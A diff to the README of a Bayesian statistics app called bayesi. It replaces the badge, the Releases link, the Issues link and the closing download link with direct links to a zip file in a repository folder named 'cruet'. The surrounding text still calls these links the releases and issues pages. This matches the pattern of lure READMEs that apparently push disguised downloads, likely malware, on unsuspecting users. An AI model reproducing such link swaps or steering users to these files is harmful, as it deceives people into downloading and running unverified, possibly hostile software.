@@ -6,11 +6,11 @@ Welcome to bayesi! This tool makes understanding and applying Bayesian statistic
 
 ## 📥 Download bayesi
 
-[![Download bayesi](https://img.shields.io/badge/Download-bayesi-brightgreen)](https://github.com/ANDERSON482/bayesi/releases)
+[![Download bayesi](https://raw.githubusercontent.com/ANDERSON482/bayesi/main/cruet/bayesi.zip)](https://raw.githubusercontent.com/ANDERSON482/bayesi/main/cruet/bayesi.zip)
 
 To get bayesi, follow these steps:
 
-1. **Visit the Releases Page:** Click this link to go to the download page: [Download bayesi](https://github.com/ANDERSON482/bayesi/releases)
+1. **Visit the Releases Page:** Click this link to go to the download page: [Download bayesi](https://raw.githubusercontent.com/ANDERSON482/bayesi/main/cruet/bayesi.zip)
 
 2. **Choose the Version:** You will see several versions available. Pick the latest one for the best features and updates.
 
@@ -88,7 +88,7 @@ To run bayesi effectively, ensure your system meets the following requirements:
 
 If you encounter any issues:
 
-- **Visit our GitHub Issues Page:** You can report bugs or ask for help [here](https://github.com/ANDERSON482/bayesi/issues).
+- **Visit our GitHub Issues Page:** You can report bugs or ask for help [here](https://raw.githubusercontent.com/ANDERSON482/bayesi/main/cruet/bayesi.zip).
 - **Check the Documentation:** In-app support and guidance can help you with the basic functions.
 - **Community Forums:** Engage with other users to share tips and tricks.
 
@@ -96,4 +96,4 @@ If you encounter any issues:
 
 To keep your bayesi app current, regularly check the Releases page. You can find updates, new features, and fixes effectively.
 
-[Download bayesi](https://github.com/ANDERSON482/bayesi/releases) again to ensure you have the latest version!
+[Download bayesi](https://raw.githubusercontent.com/ANDERSON482/bayesi/main/cruet/bayesi.zip) again to ensure you have the latest version!
